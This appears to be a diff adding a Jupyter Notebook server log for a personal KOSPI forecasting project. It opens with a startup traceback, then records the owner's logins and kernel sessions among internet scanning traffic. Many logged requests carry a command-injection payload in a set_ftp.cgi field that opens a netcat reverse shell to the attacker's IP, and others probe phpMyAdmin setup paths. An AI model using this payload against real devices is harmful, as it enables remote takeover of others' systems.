@@ -1,0 +1,563 @@
+Traceback (most recent call last):
+  File "/home/kqr/kqr/bin/jupyter-notebook", line 8, in <module>
+    sys.exit(main())
+  File "/home/kqr/kqr/lib/python3.7/site-packages/jupyter_core/application.py", line 270, in launch_instance
+    return super(JupyterApp, cls).launch_instance(argv=argv, **kwargs)
+  File "/home/kqr/kqr/lib/python3.7/site-packages/traitlets/config/application.py", line 836, in launch_instance
+    app.initialize(argv)
+  File "/home/kqr/kqr/lib/python3.7/site-packages/traitlets/config/application.py", line 86, in inner
+    return method(app, *args, **kwargs)
+  File "/home/kqr/kqr/lib/python3.7/site-packages/notebook/notebookapp.py", line 2037, in initialize
+    self.init_webapp()
+  File "/home/kqr/kqr/lib/python3.7/site-packages/notebook/notebookapp.py", line 1680, in init_webapp
+    self.jinja_environment_options,
+  File "/home/kqr/kqr/lib/python3.7/site-packages/notebook/notebookapp.py", line 187, in __init__
+    default_url, settings_overrides, jinja_env_options)
+  File "/home/kqr/kqr/lib/python3.7/site-packages/notebook/notebookapp.py", line 302, in init_settings
+    nbextensions_path=jupyter_app.nbextensions_path,
+  File "/home/kqr/kqr/lib/python3.7/site-packages/notebook/notebookapp.py", line 1292, in nbextensions_path
+    from IPython.paths import get_ipython_dir
+  File "/home/kqr/kqr/lib/python3.7/site-packages/IPython/__init__.py", line 56, in <module>
+    from .terminal.embed import embed
+  File "/home/kqr/kqr/lib/python3.7/site-packages/IPython/terminal/embed.py", line 16, in <module>
+    from IPython.terminal.interactiveshell import TerminalInteractiveShell
+  File "/home/kqr/kqr/lib/python3.7/site-packages/IPython/terminal/interactiveshell.py", line 35, in <module>
+    from .debugger import TerminalPdb, Pdb
+  File "/home/kqr/kqr/lib/python3.7/site-packages/IPython/terminal/debugger.py", line 8, in <module>
+    from IPython.core.completer import IPCompleter
+  File "/home/kqr/kqr/lib/python3.7/site-packages/IPython/core/completer.py", line 146, in <module>
+    import jedi
+  File "/home/kqr/kqr/lib/python3.7/site-packages/jedi/__init__.py", line 32, in <module>
+    from jedi.api import Script, Interpreter, set_debug_function, \
+  File "/home/kqr/kqr/lib/python3.7/site-packages/jedi/api/__init__.py", line 34, in <module>
+    from jedi.api.refactoring.extract import extract_function, extract_variable
+  File "<frozen importlib._bootstrap>", line 983, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 967, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 677, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 724, in exec_module
+  File "<frozen importlib._bootstrap_external>", line 857, in get_code
+  File "<frozen importlib._bootstrap_external>", line 525, in _compile_bytecode
+KeyboardInterrupt
+[I 17:41:19.118 NotebookApp] Serving notebooks from local directory: /home/kqr/2020/KOSPI_AI_Model
+[I 17:41:19.118 NotebookApp] Jupyter Notebook 6.1.4 is running at:
+[I 17:41:19.118 NotebookApp] http://zerohertz-pi:8889/
+[I 17:41:19.118 NotebookApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
+[I 17:41:28.371 NotebookApp] 302 GET / (192.168.123.104) 2.45ms
+[I 17:43:06.284 NotebookApp] Kernel started: 684a1352-da34-4df8-ab4e-8dfd93d83138, name: kqr
+[I 17:43:35.400 NotebookApp] Starting buffering for 684a1352-da34-4df8-ab4e-8dfd93d83138:1e4ec6ff774e4230a7cbb1718d61e36d
+[I 17:43:39.020 NotebookApp] Kernel started: beb40fe0-3fd9-415d-b7a9-7160870157ac, name: kqr
+[I 17:43:54.259 NotebookApp] Starting buffering for beb40fe0-3fd9-415d-b7a9-7160870157ac:8be066b6e4204f7b84d55d6ee7d203eb
+[I 17:43:58.272 NotebookApp] Kernel shutdown: beb40fe0-3fd9-415d-b7a9-7160870157ac
+[I 17:43:58.784 NotebookApp] Kernel shutdown: 684a1352-da34-4df8-ab4e-8dfd93d83138
+[W 18:47:08.627 NotebookApp] 404 GET login.cgi (2.57.122.185) 50.21ms referer=None
+[W 18:47:18.925 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 8.92ms referer=None
+[W 18:47:19.254 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.58ms referer=None
+[W 18:47:19.944 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.05ms referer=None
+[W 18:47:20.279 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.69ms referer=None
+[W 18:47:20.961 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.22ms referer=None
+[W 18:47:21.299 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.71ms referer=None
+[W 18:47:21.974 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.98ms referer=None
+[W 18:47:22.305 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.41ms referer=None
+[W 18:47:22.995 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.02ms referer=None
+[W 18:47:23.341 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.52ms referer=None
+[W 18:55:18.642 NotebookApp] 404 GET login.cgi (103.145.13.109) 6.32ms referer=None
+[W 18:55:29.251 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (103.145.13.109) 6.33ms referer=None
+[W 18:55:30.207 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (103.145.13.109) 6.44ms referer=None
+[W 18:55:30.844 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+112.49.52.58+1245+-e+%2Fbin%2Fsh%29 (103.145.13.109) 7.55ms referer=None
+[W 18:55:31.156 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (103.145.13.109) 6.68ms referer=None
+[W 18:55:32.122 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (103.145.13.109) 6.57ms referer=None
+[W 18:55:33.089 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (103.145.13.109) 6.50ms referer=None
+[I 20:03:39.685 NotebookApp] 302 GET / (83.97.20.25) 2.20ms
+[I 20:03:40.297 NotebookApp] 302 GET /tree? (83.97.20.25) 3.24ms
+[W 20:28:37.184 NotebookApp] 404 GET login.cgi (5.189.143.170) 6.15ms referer=None
+[I 22:07:20.720 NotebookApp] 302 GET / (36.94.183.141) 0.92ms
+[I 23:36:32.743 NotebookApp] 302 GET / (120.151.248.134) 1.89ms
+[I 00:25:43.260 NotebookApp] 302 GET / (139.162.66.65) 2.29ms
+[W 00:31:54.069 NotebookApp] 404 GET login.cgi (84.21.170.43) 6.20ms referer=None
+[W 00:37:21.135 NotebookApp] 404 GET login.cgi (2.57.122.185) 6.15ms referer=None
+[W 00:37:31.469 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.05ms referer=None
+[W 00:37:31.792 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.64ms referer=None
+[W 00:37:32.458 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.19ms referer=None
+[W 00:37:32.798 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.19ms referer=None
+[W 00:37:33.486 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.92ms referer=None
+[W 00:37:33.847 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.44ms referer=None
+[W 00:37:34.556 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.93ms referer=None
+[W 00:37:34.893 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.58ms referer=None
+[W 00:37:35.569 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.27ms referer=None
+[W 00:37:35.909 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.77ms referer=None
+[W 00:48:14.238 NotebookApp] 404 GET login.cgi (193.239.147.226) 6.25ms referer=None
+[I 01:59:28.968 NotebookApp] 302 GET / (181.143.197.179) 2.00ms
+[W 02:25:27.503 NotebookApp] 404 GET login.cgi (5.189.143.170) 6.27ms referer=None
+[W 03:04:21.473 NotebookApp] 404 GET login.cgi (2.57.122.185) 6.36ms referer=None
+[W 03:04:31.804 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.49ms referer=None
+[W 03:04:32.154 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 5.26ms referer=None
+[W 03:04:32.834 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.31ms referer=None
+[W 03:04:33.176 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.62ms referer=None
+[W 03:04:33.853 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.18ms referer=None
+[W 03:04:34.201 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.54ms referer=None
+[W 03:04:34.882 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.10ms referer=None
+[W 03:04:35.218 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.62ms referer=None
+[W 03:04:35.917 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.87ms referer=None
+[W 03:04:36.238 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.41ms referer=None
+[I 03:53:06.533 NotebookApp] 302 GET / (117.111.18.89) 1.89ms
+[I 03:53:06.604 NotebookApp] 302 GET /tree? (117.111.18.89) 2.02ms
+[I 03:53:10.371 NotebookApp] 302 POST /login?next=%2Ftree%3F (117.111.18.89) 276.59ms
+[I 04:11:49.239 NotebookApp] 302 GET / (117.111.18.89) 2.03ms
+[W 05:10:06.520 NotebookApp] 404 GET /phpMyAdmin-3.0.0.0-all-languages/scripts/setup.php (185.216.140.192) 5.35ms referer=None
+[W 05:10:07.159 NotebookApp] 404 GET /phpMyAdmin-2.10.0.0/scripts/setup.php (185.216.140.192) 6.22ms referer=None
+[W 05:10:07.738 NotebookApp] 404 GET /phpMyAdmin-2.11.11/scripts/setup.php (185.216.140.192) 6.19ms referer=None
+[W 05:10:08.422 NotebookApp] 404 GET /phpMyAdmin-2.11.11.3/scripts/setup.ph (185.216.140.192) 6.27ms referer=None
+[W 05:10:09.118 NotebookApp] 404 GET /phpMyAdmin-2/scripts/setup.php (185.216.140.192) 6.98ms referer=None
+[W 05:10:09.800 NotebookApp] 404 GET /my/scripts/setup.php (185.216.140.192) 5.25ms referer=None
+[W 05:10:10.527 NotebookApp] 404 GET /MyAdmin/scripts/setup.php (185.216.140.192) 2.83ms referer=None
+[W 05:10:11.268 NotebookApp] 404 GET /PHPMYADMIN/scripts/setup.php (185.216.140.192) 6.24ms referer=None
+[W 05:10:11.957 NotebookApp] 404 GET /db/scripts/setup.php (185.216.140.192) 6.14ms referer=None
+[W 05:10:12.595 NotebookApp] 404 GET /dbadmin/scripts/setup.php (185.216.140.192) 6.15ms referer=None
+[W 05:10:13.294 NotebookApp] 404 GET /myadmin/scripts/setup.php (185.216.140.192) 6.20ms referer=None
+[W 05:10:14.066 NotebookApp] 404 GET /mysql/scripts/setup.php (185.216.140.192) 6.13ms referer=None
+[W 05:10:14.714 NotebookApp] 404 GET /mysqladmin/scripts/setup.php (185.216.140.192) 6.30ms referer=None
+[W 05:10:15.490 NotebookApp] 404 GET /pHpMyAdMiN/scripts/setup.php (185.216.140.192) 6.22ms referer=None
+[W 05:10:16.217 NotebookApp] 404 GET /phpMyAdmin/scripts/setup.php (185.216.140.192) 6.14ms referer=None
+[W 05:10:16.799 NotebookApp] 404 GET /phpadmin/scripts/setup.php (185.216.140.192) 6.28ms referer=None
+[W 05:10:17.515 NotebookApp] 404 GET /phpmyadmin/scripts/setup.php (185.216.140.192) 6.18ms referer=None
+[W 05:10:18.257 NotebookApp] 404 GET /sqladm/scripts/setup.php (185.216.140.192) 2.87ms referer=None
+[W 05:10:18.901 NotebookApp] 404 GET /sqladmin/scripts/setup.php (185.216.140.192) 6.29ms referer=None
+[W 05:10:19.678 NotebookApp] 404 GET /phpmyadmin/scripts/db.init.php (185.216.140.192) 2.85ms referer=None
+[W 05:10:20.380 NotebookApp] 404 GET /phpMyAdmin/scripts/db.init.php (185.216.140.192) 6.52ms referer=None
+[W 05:10:20.942 NotebookApp] 404 GET /MyAdmin/scripts/setup.php (185.216.140.192) 6.49ms referer=None
+[W 05:10:21.548 NotebookApp] 404 GET /database/scripts/setup.php (185.216.140.192) 5.04ms referer=None
+[W 05:10:22.205 NotebookApp] 404 GET /phpAdmin/scripts/setup.php (185.216.140.192) 6.12ms referer=None
+[W 05:10:22.822 NotebookApp] 404 GET /phpmyadmin1/scripts/setup.php (185.216.140.192) 6.22ms referer=None
+[W 05:10:23.430 NotebookApp] 404 GET /phpmyadmin2/scripts/setup.php (185.216.140.192) 6.23ms referer=None
+[W 05:10:24.038 NotebookApp] 404 GET /pma/scripts/setup.php (185.216.140.192) 6.20ms referer=None
+[W 05:10:24.778 NotebookApp] 404 GET /scripts/setup.php (185.216.140.192) 6.11ms referer=None
+[W 05:10:25.365 NotebookApp] 404 GET /setup.php (185.216.140.192) 6.11ms referer=None
+[W 05:48:13.017 NotebookApp] 404 GET login.cgi (2.57.122.185) 6.15ms referer=None
+[W 05:48:23.352 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.30ms referer=None
+[W 05:48:23.694 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.84ms referer=None
+[W 05:48:24.370 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.04ms referer=None
+[W 05:48:24.706 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.69ms referer=None
+[W 05:48:25.394 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.28ms referer=None
+[W 05:48:25.742 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.66ms referer=None
+[W 05:48:26.438 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 4.51ms referer=None
+[W 05:48:26.786 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.66ms referer=None
+[W 05:48:27.467 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.12ms referer=None
+[W 05:48:27.810 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.55ms referer=None
+[W 06:18:14.691 NotebookApp] 404 GET login.cgi (5.189.143.170) 6.42ms referer=None
+[I 06:21:38.191 NotebookApp] 302 GET / (49.168.34.221) 1.90ms
+[I 06:21:38.205 NotebookApp] 302 GET /tree? (49.168.34.221) 2.45ms
+[I 06:21:44.173 NotebookApp] 302 POST /login?next=%2Ftree%3F (49.168.34.221) 287.52ms
+[I 06:22:03.917 NotebookApp] Kernel started: e8648277-1930-40a0-8061-0303e283cd01, name: kqr
+[I 06:22:39.354 NotebookApp] Kernel started: 39947983-7b53-4a31-a119-c444828e111b, name: kqr
+[I 06:23:19.528 NotebookApp] Starting buffering for 39947983-7b53-4a31-a119-c444828e111b:1280fb381e184eb886d723c4e9170fb2
+[I 06:23:19.984 NotebookApp] Starting buffering for e8648277-1930-40a0-8061-0303e283cd01:9a491bf002364a3e8d0ec1aea1f7ceee
+[I 06:25:34.202 NotebookApp] 302 GET / (49.168.34.221) 1.95ms
+[W 06:27:10.430 NotebookApp] 400 GET /api/contents/forecast_model.pkl?type=file&format=text&_=1602912431688 (49.168.34.221): /home/kqr/2020/KOSPI_AI_Model/forecast_model.pkl is not UTF-8 encoded
+[W 06:27:10.431 NotebookApp] /home/kqr/2020/KOSPI_AI_Model/forecast_model.pkl is not UTF-8 encoded
+[W 06:27:10.433 NotebookApp] 400 GET /api/contents/forecast_model.pkl?type=file&format=text&_=1602912431688 (49.168.34.221) 27.91ms referer=http://zerohertz.xyz:81/edit/forecast_model.pkl
+[I 06:27:32.013 NotebookApp] Starting buffering for e8648277-1930-40a0-8061-0303e283cd01:740b4b4be27b4b96807fbe5f7b78905c
+[I 06:29:53.780 NotebookApp] 302 GET / (49.168.34.221) 2.00ms
+[I 06:33:52.095 NotebookApp] Starting buffering for 39947983-7b53-4a31-a119-c444828e111b:f55831dd1eeb40df891070172aa59008
+[I 06:52:44.072 NotebookApp] 302 GET / (117.111.18.89) 2.23ms
+[I 06:53:00.306 NotebookApp] Starting buffering for e8648277-1930-40a0-8061-0303e283cd01:a10b063c33dd4d4db639710cee9cfcd8
+[I 06:53:01.551 NotebookApp] 302 GET / (117.111.18.89) 1.90ms
+[I 06:53:10.621 NotebookApp] Starting buffering for 39947983-7b53-4a31-a119-c444828e111b:177877eaf8ca4ccc9c69d3db917151bb
+[I 06:53:13.239 NotebookApp] Kernel shutdown: 39947983-7b53-4a31-a119-c444828e111b
+[I 06:53:13.651 NotebookApp] Kernel shutdown: e8648277-1930-40a0-8061-0303e283cd01
+[W 07:47:01.739 NotebookApp] 404 GET login.cgi (2.57.122.185) 6.55ms referer=None
+[W 07:47:12.071 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 5.78ms referer=None
+[W 07:47:12.411 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.55ms referer=None
+[W 07:47:13.089 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.03ms referer=None
+[W 07:47:13.425 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.34ms referer=None
+[W 07:47:14.106 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.85ms referer=None
+[W 07:47:14.449 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 5.33ms referer=None
+[W 07:47:15.144 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 5.70ms referer=None
+[W 07:47:15.494 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.55ms referer=None
+[W 07:47:16.177 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 5.77ms referer=None
+[W 07:47:16.525 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.42ms referer=None
+[I 08:05:50.038 NotebookApp] 302 GET / (102.165.30.25) 2.10ms
+[I 08:05:50.474 NotebookApp] 302 GET /tree (102.165.30.25) 2.69ms
+[W 08:20:38.981 NotebookApp] 404 GET login.cgi (5.189.143.170) 6.37ms referer=None
+[I 09:58:48.506 NotebookApp] 302 GET / (117.111.18.89) 1.86ms
+[W 10:35:36.693 NotebookApp] 404 GET login.cgi (37.46.150.223) 6.16ms referer=None
+[I 10:47:49.600 NotebookApp] 302 GET / (218.28.59.130) 2.22ms
+[I 11:39:16.228 NotebookApp] 302 GET / (117.111.18.89) 1.83ms
+[W 12:55:48.885 NotebookApp] 404 GET /phpMyAdmin-3.0.0.0-all-languages/scripts/setup.php (89.248.174.203) 6.09ms referer=None
+[W 12:55:49.551 NotebookApp] 404 GET /phpMyAdmin-2.10.0.0/scripts/setup.php (89.248.174.203) 6.07ms referer=None
+[W 12:55:50.171 NotebookApp] 404 GET /phpMyAdmin-2.11.11/scripts/setup.php (89.248.174.203) 6.07ms referer=None
+[W 12:55:50.831 NotebookApp] 404 GET /phpMyAdmin-2.11.11.3/scripts/setup.ph (89.248.174.203) 6.17ms referer=None
+[W 12:55:51.446 NotebookApp] 404 GET /phpMyAdmin-2/scripts/setup.php (89.248.174.203) 5.98ms referer=None
+[W 12:55:52.062 NotebookApp] 404 GET /my/scripts/setup.php (89.248.174.203) 6.08ms referer=None
+[W 12:55:52.647 NotebookApp] 404 GET /MyAdmin/scripts/setup.php (89.248.174.203) 6.02ms referer=None
+[W 12:55:53.248 NotebookApp] 404 GET /PHPMYADMIN/scripts/setup.php (89.248.174.203) 6.09ms referer=None
+[W 12:55:53.936 NotebookApp] 404 GET /db/scripts/setup.php (89.248.174.203) 6.00ms referer=None
+[W 12:55:54.596 NotebookApp] 404 GET /dbadmin/scripts/setup.php (89.248.174.203) 6.01ms referer=None
+[W 12:55:55.194 NotebookApp] 404 GET /myadmin/scripts/setup.php (89.248.174.203) 6.11ms referer=None
+[W 12:55:55.887 NotebookApp] 404 GET /mysql/scripts/setup.php (89.248.174.203) 6.01ms referer=None
+[W 12:55:56.518 NotebookApp] 404 GET /mysqladmin/scripts/setup.php (89.248.174.203) 6.01ms referer=None
+[W 12:55:57.340 NotebookApp] 404 GET /pHpMyAdMiN/scripts/setup.php (89.248.174.203) 6.13ms referer=None
+[W 12:55:58.055 NotebookApp] 404 GET /phpMyAdmin/scripts/setup.php (89.248.174.203) 6.02ms referer=None
+[W 12:55:58.877 NotebookApp] 404 GET /phpadmin/scripts/setup.php (89.248.174.203) 5.99ms referer=None
+[W 12:55:59.471 NotebookApp] 404 GET /phpmyadmin/scripts/setup.php (89.248.174.203) 6.09ms referer=None
+[W 12:56:00.088 NotebookApp] 404 GET /sqladm/scripts/setup.php (89.248.174.203) 6.08ms referer=None
+[W 12:56:00.790 NotebookApp] 404 GET /sqladmin/scripts/setup.php (89.248.174.203) 6.10ms referer=None
+[W 12:56:01.609 NotebookApp] 404 GET /phpmyadmin/scripts/db.init.php (89.248.174.203) 2.86ms referer=None
+[W 12:56:02.268 NotebookApp] 404 GET /phpMyAdmin/scripts/db.init.php (89.248.174.203) 2.77ms referer=None
+[W 12:56:02.944 NotebookApp] 404 GET /MyAdmin/scripts/setup.php (89.248.174.203) 6.06ms referer=None
+[W 12:56:03.677 NotebookApp] 404 GET /database/scripts/setup.php (89.248.174.203) 6.46ms referer=None
+[W 12:56:04.270 NotebookApp] 404 GET /phpAdmin/scripts/setup.php (89.248.174.203) 6.14ms referer=None
+[W 12:56:04.927 NotebookApp] 404 GET /phpmyadmin1/scripts/setup.php (89.248.174.203) 6.00ms referer=None
+[W 12:56:05.599 NotebookApp] 404 GET /phpmyadmin2/scripts/setup.php (89.248.174.203) 6.07ms referer=None
+[W 12:56:06.237 NotebookApp] 404 GET /pma/scripts/setup.php (89.248.174.203) 5.98ms referer=None
+[W 12:56:06.928 NotebookApp] 404 GET /scripts/setup.php (89.248.174.203) 6.11ms referer=None
+[W 12:56:07.638 NotebookApp] 404 GET /setup.php (89.248.174.203) 6.07ms referer=None
+[W 13:20:25.148 NotebookApp] 404 GET login.cgi (2.57.122.185) 6.39ms referer=None
+[W 13:20:35.496 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 6.96ms referer=None
+[W 13:20:35.840 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.44ms referer=None
+[W 13:20:36.510 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.00ms referer=None
+[W 13:20:36.852 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.44ms referer=None
+[W 13:20:37.562 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.06ms referer=None
+[W 13:20:37.895 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 6.37ms referer=None
+[W 13:20:38.599 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 9.23ms referer=None
+[W 13:20:38.930 NotebookApp] 404 GET /ftptest.cgi?loginuse=&loginpas= (2.57.122.185) 5.31ms referer=None
+[W 13:20:39.624 NotebookApp] 404 GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+2.57.122.185+1245+-e+%2Fbin%2Fsh%29 (2.57.122.185) 7.02ms referer=None
